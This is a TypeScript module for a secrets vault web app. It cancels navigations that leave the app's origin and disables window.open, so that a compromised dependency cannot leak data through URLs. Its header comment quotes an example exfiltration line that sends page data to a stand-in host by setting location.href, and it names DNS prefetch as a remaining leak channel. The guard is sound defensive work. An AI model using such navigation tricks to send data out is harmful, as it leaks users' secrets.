/**
 * Cross-origin navigation guard (backlog: "cross-origin navigation as an exfil channel"). `connect-src 'none'` stops
 * fetch, XHR, WebSocket, EventSource and beacons, but CSP has no directive for top-level navigation (`navigate-to`
 * was dropped from CSP3), so script running in this page could still leak data in a URL: `location.href =
 * "https://x.example/?" + data`, a link click, or `window.open`. This guard, installed before any other module runs:
 *  - cancels every navigation of this window that leaves the app's origin (Navigation API `navigate` event; Chromium,
 *    which is what the e2e suite runs, and Safari 26+ / Firefox 147+), and
 *  - replaces `window.open` with one that opens nothing.
 * It is a speed bump for a compromised dependency, not a boundary: code in this page could still find another
 * channel (DNS prefetch of a crafted host name, for one), and where the Navigation API is missing only
 * `window.open` is covered. The real boundaries stay: secrets exist only inside the signing worker, which can't
 * navigate and has no network; the main thread only ever sees words while the user reads or types them.
 */

interface NavigateEventLike extends Event {
  destination: { url: string };
  cancelable: boolean;
}

export function installNavigationGuard(w: Window & typeof globalThis = window): { navigationApi: boolean } {
  const origin = w.location.origin;
  const nav = (w as unknown as { navigation?: EventTarget }).navigation;
  if (nav && typeof nav.addEventListener === "function") {
    nav.addEventListener("navigate", (e) => {
      const ev = e as NavigateEventLike;
      let dest: URL | undefined;
      try {
        dest = new URL(ev.destination.url);
      } catch {
        dest = undefined;
      }
      if ((!dest || dest.origin !== origin) && ev.cancelable) {
        ev.preventDefault();
        console.warn("LEAKED Vault: blocked a navigation away from the app");
      }
    });
  }
  Object.defineProperty(w, "open", {
    value: () => null,
    writable: false,
    configurable: false,
  });
  return { navigationApi: !!nav };
}

installNavigationGuard();
